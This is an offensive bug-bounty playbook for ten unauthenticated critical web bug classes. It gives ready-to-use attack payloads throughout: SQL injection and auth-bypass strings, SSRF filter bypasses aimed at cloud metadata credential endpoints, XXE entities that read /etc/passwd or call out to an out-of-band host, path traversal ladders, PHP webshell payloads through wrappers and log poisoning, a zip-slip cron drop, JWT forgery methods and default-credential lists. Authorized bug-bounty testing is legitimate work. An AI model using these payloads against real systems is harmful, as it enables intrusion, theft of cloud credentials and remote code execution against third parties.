# Top-10 Unauthenticated P1 Bug Classes — Manual Playbook

Every class below assumes **zero credentials** and **only the TLD**. No scanner is the discovery method; scanners are only used at the very end to confirm a manual finding.

---

## 1. Pre-auth Remote Code Execution (RCE) — CVSS 10.0

**The crown jewel.** No login, full command execution on the target's server.

### Where it lives
- Legacy enterprise products (Confluence, Jira, GitLab, Citrix, F5, Fortinet, MOVEit, Telerik, Struts, Drupal, Spring, Apache OFBiz, JBoss, WebLogic, WebSphere, GhostScript, ImageMagick, ExifTool)
- Dev/staging/CI hosts (Jenkins, TeamCity, GoCD, Drone, Argo, Airflow, Zeppelin, Hadoop, Spark)
- Custom file processors that shell out
- Template engines (SSTI → RCE on Smarty, Twig, Jinja2, Freemarker, Velocity, Handlebars, ERB)
- Unsafe deserialization (Java, .NET ViewState, PHP, Python `cPickle`-family, Ruby YAML, Node.js)

### Manual hunt
1. **Banner grep first.** From `probe.json`, pull every host running an enterprise product or CI tool.
2. **Exact version.** Don't trust the title — fetch `/login`, `/about`, `/help`, footers, `/manager/status`, `X-Powered-By`, and JS bundle filenames for build hashes.
3. **CVE map.** Check `references/preauth-cves.md` for the exact version. If on a vendor advisory page, read the **patched-in** column — anything earlier is in play.
4. **Confirm before exploit.** Most pre-auth RCEs have a *version-disclosure-only* check that proves vulnerability without firing the exploit (e.g. Confluence `/server-info.action`, GitLab `/help`, Spring `/error` with magic input).
5. **Exploit on your own clone first.** Stand up the vulnerable version locally with Docker, perfect the PoC, then run it once against the live host with a marker (`id; hostname; curl OOB`).

### Top current targets (verify CVEs before assuming)
- Confluence: CVE-2022-26134 (OGNL), CVE-2023-22515 (admin creation), CVE-2023-22518 (config wipe)
- GitLab: CVE-2023-7028 (no-click ATO via secondary email reset)
- MOVEit: CVE-2023-34362
- Citrix: CVE-2023-4966 (Citrix Bleed)
- FortiOS / FortiSwitchManager: CVE-2022-42475, CVE-2024-21762
- F5 BIG-IP: CVE-2022-1388, CVE-2023-46747
- Jenkins: CVE-2024-23897 (CLI args, file read → RCE chain)
- Apache Struts: CVE-2023-50164 (file upload), CVE-2017-5638
- PaperCut: CVE-2023-27350
- Telerik UI: CVE-2019-18935 (deserialization)
- Apache OFBiz: CVE-2023-49070 + CVE-2023-51467 (auth bypass + XML-RPC)
- GhostScript: CVE-2023-36664
- WebLogic: CVE-2020-14882 / CVE-2023-21931

### Escalation
RCE is terminal — just prove `id` / `hostname` / `whoami`. Do not dump data, do not pivot. Report immediately.

---

## 2. SQL Injection — Auth Bypass / Dump — CVSS 9.8

### Where unauth SQLi lives
- Search bars / autosuggest / typeahead (`?q=`, `?search=`)
- Filter / sort params (`?orderBy=`, `?sortField=`, `?direction=`)
- Login forms (auth bypass) and password reset email lookup
- Promo / coupon / referral code endpoints
- Public REST/GraphQL endpoints reachable without a token
- API parameters reflected directly into ORM queries (mass-assigned filters)
- Headers reflected into queries: `X-Forwarded-For`, `User-Agent`, `Referer`, `Host`, `Cookie`

### Manual hunt (token-efficient, no sqlmap-first)
1. **Surface map.** From `urls.hist` + `crawled.txt`, extract every URL with a query string. Bucket by parameter name; SQLi rarely hides in obscure params — favourites recur.
2. **Tier-1 payloads** (send each manually, watch response):
   - `'` → 500 or DB error string = JACKPOT
   - `' OR '1'='1` then `' OR '1'='2` → boolean diff
   - `'||SLEEP(5)--` (MySQL), `';SELECT pg_sleep(5)--` (Postgres), `';WAITFOR DELAY '0:0:5'--` (MSSQL) → time diff
   - `ORDER BY 9999--` → column-count error
3. **Header injection check.** Repeat with `X-Forwarded-For: '` and `User-Agent: '`. Many WAFs miss header sinks.
4. **Auth-bypass spot check.** On login: `' OR 1=1--`, `admin'--`, `'/*` → if response shape matches a success path, you bypassed.
5. **Fingerprint DBMS** by error string or function probe:
   - MySQL: `@@version`, `database()`
   - Postgres: `version()`, `current_database()`
   - MSSQL: `@@version`, `db_name()`
   - Oracle: `v$version`, `SYS.USER_USERS`
   - SQLite: `sqlite_version()`
6. **Only now** consider sqlmap / ghauri to automate exfil, with a captured request file and a tight `--level/--risk`. → delegate to `sqli-hunter-agent`.

### Escalation
- Dump one user record + schema list = proof of impact.
- If `FILE` privilege (MySQL) or `xp_cmdshell` (MSSQL) or `COPY ... FROM PROGRAM` (Postgres) → escalates to RCE → P1 ceiling.

---

## 3. Unauthenticated SSRF (Full Internal Access) — CVSS 9.8

### Where unauth SSRF lives
- URL-fetcher params: `?url=`, `?image=`, `?fetch=`, `?proxy=`, `?webhook=`, `?callback=`, `?import=`, `?source=`, `?dest=`
- Link previews / unfurlers (Slack-style, on signup or contact forms)
- PDF / screenshot / thumbnail / OG-image generators
- RSS readers, OAuth `request_uri`, OpenID Connect issuer discovery
- XML/SOAP/SAML endpoints (XXE → SSRF)
- Webhook test buttons on integration pages

### Manual hunt
1. Collect candidate params from `urls.hist`. Filter to ones reachable without a session cookie (compare a fresh-browser GET vs. an authenticated GET).
2. **Burp Collaborator** (or `interactsh` / a controlled OOB host). Issue the request with the param set to `https://OOB.collab/$random`. Wait for DNS + HTTP hits.
3. **Read response delta** for blind-vs-semi-blind. Differential timing on `?url=http://127.0.0.1:1` vs `http://127.0.0.1:80` reveals filtered ports.
4. **Bypass families** (try in order):
   - `http://localhost`, `http://127.0.0.1`, `http://0.0.0.0`, `http://[::]`, `http://[::1]`
   - Decimal IP: `http://2130706433`, octal `http://0177.0.0.1`, hex `http://0x7f000001`
   - DNS rebinding: `http://1u.<owned>.com` resolving alternately to public→127.0.0.1
   - URL parser confusion: `http://evil.com@127.0.0.1`, `http://127.0.0.1#@evil.com`, `http://127.0.0.1.nip.io`
   - Open redirect chain: target fetches your URL → 302 to `http://169.254.169.254/...`
5. **Cloud metadata payloads** once you have raw fetch:
   - AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - AWS IMDSv2 (token-required): two-step — `PUT /latest/api/token` then `GET` with token header
   - GCP: `http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json` (header `Metadata-Flavor: Google`)
   - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (header `Metadata: true`)
   - OpenStack / DigitalOcean / Alibaba — different paths, same idea
6. **gopher / dict / file** schemes for non-HTTP backends (Redis, SMTP, MySQL via gopher).

### Escalation
SSRF → IMDS creds → `aws sts get-caller-identity` → S3 read of source → harder bugs. Chain to RCE wherever possible. Document the chain in the report; bare SSRF is P3, full chain is P1.

---

## 4. IDOR — Mass Data Exposure — CVSS 9.1

Yes — IDOR can be unauth when the API doesn't require a session at all.

### Where unauth IDOR lives
- Public file/asset URLs with numeric or sequential IDs: `/files/{n}.pdf`, `/uploads/{n}.jpg`, `/invoices/{n}`, `/exports/{n}`
- "Share by link" features where the token is short / sequential / guessable
- Old export endpoints discoverable via wayback
- Public profile pages: `/profile/{n}` returning JSON when `Accept: application/json` is sent
- CDN / media endpoints: bucket key is predictable
- Receipt / order / ticket / case lookup with only an email + numeric ID

### Manual hunt
1. From `urls.hist`, extract every URL containing a numeric segment that increments.
2. Pull two adjacent IDs. Diff the responses. Two different users' data without auth = IDOR.
3. **Token entropy.** If the "share link" is `?t=ABC123`, check the alphabet + length. <8 chars or sequential timestamp = enumerable.
4. **Bypass families:**
   - JSON request to HTML endpoint: `Accept: application/json`
   - Verb tunneling: GET on a POST-only endpoint (or vice-versa)
   - Path traversal in object ID: `/api/v1/users/../admin`
   - Mass-assignment-style `?id[]=1&id[]=2`
5. **Range probe** carefully. 10 sequential IDs is enough to prove. Never bulk-scrape.

### Escalation
Quantify: "this returns the PII of any of the ~2.3M users on this platform without authentication." Cross-tenant proof multiplies severity.

---

## 5. Auth Bypass via JWT / Token Flaws — CVSS 9.8

### Where it lives
- Any host that accepts `Authorization: Bearer ...` or sets a JWT cookie
- Public mobile-API endpoints where JWT is required but verification is broken
- Microservice internal-API exposed externally that trusts JWT but accepts unsigned tokens
- OAuth/OIDC flows with custom validation

### Manual hunt — six classic JWT mistakes
Find any JWT you can obtain pre-auth (often returned by anonymous endpoints, `/anonymous/token`, `/csrf-token`, mobile bootstrap). Decode with `jwt-cli` or `jwt_tool.py`.

1. **`alg: none`** — re-encode with `{"alg":"none"}`, no signature. If accepted = bypass.
2. **`alg: HS256` switch** with the server's RSA public key as the HMAC secret (key confusion). Public key may be at `/.well-known/jwks.json` or `/oauth/keys`.
3. **Weak HS256 secret** — brute force common secrets (`secret`, `password`, `change-me`, the company name) with `hashcat -m 16500`.
4. **`kid` header injection** — `kid` parameter often controls key lookup. Try `kid: ../../../dev/null` (signature becomes empty), SQLi in `kid`, or `kid: file:///path/to/known/file`.
5. **`jku` / `x5u` header** — points to an attacker-hosted JWKS. If the server fetches it without allow-listing, you sign with your own key.
6. **Signature stripping** — some libs validate only when a `signature` field is present. Empty or omitted signature = accepted.

For each, change a privilege claim (`role:admin`, `is_staff:true`, `tenant:victim`) and re-send. Compare response.

### Tooling
- `jwt_tool.py` for fast attack matrix
- `jwt-cracker`, `hashcat -m 16500`
- Manual inspection of `.well-known/jwks.json` first to know the expected key shape

### Escalation
ATO of any user → admin role → full app compromise. Often chainable with IDOR (forge token for victim, then enumerate).

---

## 6. XXE (XML External Entity) — CVSS 9.1

### Where unauth XXE lives
- Anywhere XML is parsed: SOAP endpoints, SAML `Resolve`, RSS/Atom importers, sitemap submission, OPML, XML-RPC, DOCX/XLSX/PPTX/ODT (zip → XML), SVG upload, EPUB, KML, GPX, GraphML, JNLP
- Old WSDL endpoints discoverable via wayback (`?wsdl`)

### Manual hunt
1. Find any XML-accepting endpoint. Confirm with `Content-Type: application/xml` and a benign XML body.
2. **In-band external entity:**
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
   <r>&x;</r>
   ```
3. **Blind / OOB** when no echo:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [
     <!ENTITY % p SYSTEM "http://OOB.collab/x.dtd"> %p;
   ]><r/>
   ```
   With `x.dtd` defining a parameter-entity exfil via DNS or HTTP.
4. **Document-format vectors:** rename PoC.xml to `[Content_Types].xml` inside a DOCX, re-zip, upload.
5. **SVG vector:** SVG is XML. Upload `<svg xmlns="..."><!DOCTYPE ...><text>&x;</text></svg>`.
6. **Blind SSRF via XXE:** point `SYSTEM` to internal services — sometimes the only SSRF path.

### Escalation
File read → secret recovery → ATO. SSRF chain → metadata → cloud creds. Java parsers often allow `expect://` / `jar://` → RCE.

---

## 7. Path Traversal → Arbitrary File Read/Write — CVSS 9.3

### Where unauth traversal lives
- File download endpoints: `?file=`, `?path=`, `?download=`, `?attachment=`
- Template selectors: `?template=`, `?theme=`, `?view=`
- Image / static file serving: `/assets/{file}`, `/static/{file}`
- Archive extraction (ZIP slip): user uploads zip that extracts to `../../etc/cron.d/x`
- Log viewers, backup downloaders, certificate / kubeconfig viewers
- Email attachment fetcher

### Manual hunt
1. Find candidate endpoints from `urls.hist` and the JS endpoint dump.
2. **Payload ladder** (try each until one returns `/etc/passwd` or `C:\Windows\win.ini`):
   - `../../../../etc/passwd`
   - `..%2f..%2f..%2fetc%2fpasswd` (URL-encoded)
   - `..%252f..%252f..%252fetc%252fpasswd` (double-encoded)
   - `....//....//....//etc/passwd` (mid-string filter bypass)
   - `..%c0%af..%c0%af..%c0%afetc%c0%afpasswd` (UTF-8 overlong)
   - On Windows: `..\..\..\Windows\win.ini`, `..%5c..%5c..%5cWindows%5cwin.ini`
3. **Absolute path** (when relative is filtered): `/etc/passwd`, `\\?\C:\windows\win.ini`
4. **Null byte / extension suffix bypass:** `../../../../etc/passwd%00`, `...passwd%00.png`
5. **Prefix tricks:** `file:///etc/passwd`, `php://filter/convert.base64-encode/resource=index.php` (LFI-PHP)
6. **Zip slip:** craft a zip with `../../etc/cron.d/0evil` as a member name; upload to an extraction endpoint; check for code execution at next cron tick.

### Escalation
Read order of operations: app source → `.env` / config / DB creds → SSH keys → AWS creds → pivot. Arbitrary write = RCE via cron / web-shell / SSH key.

---

## 8. BOLA on GraphQL / REST (No-Auth API Exposure) — CVSS 9.1

When the API endpoint just doesn't check auth at all.

### Where it lives
- `/internal/`, `/private/`, `/admin/api/` exposed externally (often via legacy reverse-proxy rules)
- Mobile-only API host where the dev assumed only the app would hit it
- Microservice direct-access port (service-mesh assumption broken)
- GraphQL deployed without `requireAuth` middleware
- Old v1 API after v2 added auth — v1 still public

### Manual hunt
1. From port-scan results and `probe.json`, list every HTTP/S service NOT on the main app's hostname/port.
2. Send unauthenticated requests to obvious endpoints: `/health`, `/users`, `/orders`, `/admin/stats`, `/internal/users/1`, `/api/v1/users`.
3. **GraphQL specifics:**
   - Try `/graphql`, `/api/graphql`, `/v1/graphql`, `/query`, `/graphiql`
   - Introspect: `{__schema{types{name,fields{name}}}}` — works if introspection on.
   - Even with introspection off, blind-introspect via field-suggestions: send `{user(id:"1"){zz}}` and read the "Did you mean ..." error.
   - Operation enumeration via `?query=` GET (CSRF + cache-poisoning combos)
4. **HTTP verb pivot.** GET-only endpoint? Try OPTIONS, HEAD, POST, PUT, PATCH, DELETE. Different verbs often have different auth.
5. **Header trust.** Try `X-Forwarded-For: 127.0.0.1`, `X-Real-IP: 127.0.0.1`, `X-Original-URL: /admin`, `X-Rewrite-URL: /admin`, `X-Custom-IP-Authorization: 127.0.0.1`.

### Escalation
Public BOLA on a real `/users/{id}` → mass-PII. Public mutation on GraphQL → write access. Often chains to ATO via password-reset trigger.

---

## 9. Unauthenticated RFI / File Inclusion — CVSS 8.8

LFI when the included path is local; RFI when remote URLs are accepted. RFI is rarer but devastating.

### Where it lives
- PHP apps with `?page=`, `?module=`, `?include=`, `?file=` — Joomla/WordPress plugins, custom CMSes
- Old apps with `allow_url_include=On` (rare in modern PHP, but legacy hosts exist)
- Server-side template loaders that accept user-supplied template paths
- Java apps with `Class.forName(userInput)` style loaders
- Python with `__import__(userInput)`

### Manual hunt
1. Find candidate params from wayback. PHP is the biggest source — look for `.php?` URLs.
2. **LFI tests:**
   - `?page=../../../../etc/passwd`
   - `?page=php://filter/convert.base64-encode/resource=index.php` (read source as base64)
   - `?page=data://text/plain,<?php system($_GET[c]);?>&c=id` (data wrapper RCE)
   - `?page=expect://id` (rarely enabled)
   - `?page=php://input` + POST body `<?php system($_GET[c]);?>` (RCE via input wrapper)
3. **RFI tests:**
   - `?page=http://OOB.collab/x.txt` — does the server fetch?
   - If yes and PHP renders, host `<?php system($_GET[c]);?>` → instant RCE.
4. **Log poisoning** when LFI but no RFI: send `<?php system($_GET[c]);?>` in `User-Agent` (logged to `/var/log/apache2/access.log`), then `?page=/var/log/apache2/access.log&c=id`.

### Escalation
RFI → RCE in one step. LFI → source → secrets → DB / ATO. Always try wrappers before giving up.

---

## 10. Exposed Admin Panels / Default Credentials — CVSS 8.8 (often higher in chain)

The "easy" P2 that becomes a P1 when chained.

### Where they live (besides obvious `/admin`)
- `/manager/html` (Tomcat), `/jmx-console` (JBoss), `/console` (WebLogic, GlassFish)
- `/wp-admin`, `/administrator` (Joomla), `/user/login` (Drupal)
- `/jenkins`, `/grafana`, `/kibana`, `/airflow`, `/argocd`, `/rancher`
- `:8080/manager`, `:9090/console`, `:8443/setup`
- Vendor IoT and printer panels with hardcoded creds
- Cloud-provider default panels never customised

### Manual hunt
1. From port-scan: any HTTP service on a non-80/443 port deserves a manual visit. Screenshot bulk via `gowitness`, eyeball.
2. From sensitive-path sweep: `/admin`, `/administrator`, `/manager/html`, `/console`, `/setup.php`, `/install.php`, `/wp-admin/`, `/user/login`, `/login.action`, `/login.jsp`.
3. **Default-creds reference**:
   - Tomcat: `admin/admin`, `tomcat/tomcat`, `tomcat/s3cret`
   - Jenkins: rarely default; check `script` console anon access instead
   - Grafana: `admin/admin` (forces change but many forget)
   - Kibana: no default but `elastic/changeme` for the underlying ES
   - JBoss: `admin/admin`
   - Confluence/Jira: no default; check setup wizard exposure
   - Solr: no auth at all by default → admin reachable
   - Elastic: same
   - Redis: no auth by default — connect with `redis-cli` directly
   - Mongo: same — `mongo --host`
   - Memcached: same
   - Adminer/phpMyAdmin: try `root/root`, `root/(blank)`, `admin/admin`
4. **Setup wizard exposure** — `/install`, `/setup`, `/configure` reachable post-install = takeover by re-running setup pointed at attacker DB. (WordPress, Drupal, Joomla, Magento, etc.)
5. **Manage interfaces over HTTP** for embedded devices (Lantronix, Axis, Dell iDRAC, HP iLO, IPMI). Usually default creds.

### Escalation
Admin panel → upload web shell → RCE. Or admin → read DB → ATO across the app. Or admin → SSO config → take over identity provider → tenant-wide compromise.

---

## Manual workflow checklist (run for every TLD)

1. ✅ Phase 1 passive recon done (subs, urls, secrets, JS)
2. ✅ Phase 2 active fingerprint done (probe.json, ports, screenshots, JS endpoints)
3. ✅ Loop A (sensitive-path probe) — note exposures
4. ✅ Loop B (banner→bug-class) — map services to CVEs
5. ✅ Loop C (historical-URL diff) — find forgotten endpoints
6. ✅ For each of the 10 classes above, walk the param/header/verb checklist
7. ✅ Only now consider sqlmap / nuclei for confirmation of *specific* hits
8. ✅ Impact-maximize each finding (chain to higher tier wherever possible)
9. ✅ Write the report when impact is provable, not when the bug is "interesting"
